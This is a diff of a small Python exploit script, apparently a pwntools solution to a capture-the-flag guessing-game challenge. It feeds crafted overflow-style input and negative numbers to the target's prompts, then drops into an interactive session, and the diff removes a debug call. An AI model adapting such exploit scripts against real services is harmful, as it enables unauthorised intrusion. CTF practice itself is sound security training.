@@ -44,7 +44,6 @@ for i in random:
     io.sendlineafter("Enter your guess: ", str(i))
 
 io.sendlineafter("Write a few words about the game ", b"a" * 12 + b"L")
-ddebug()
 io.sendlineafter("must be less than 1000: ", b"-12 -211")
 
 io.interactive()
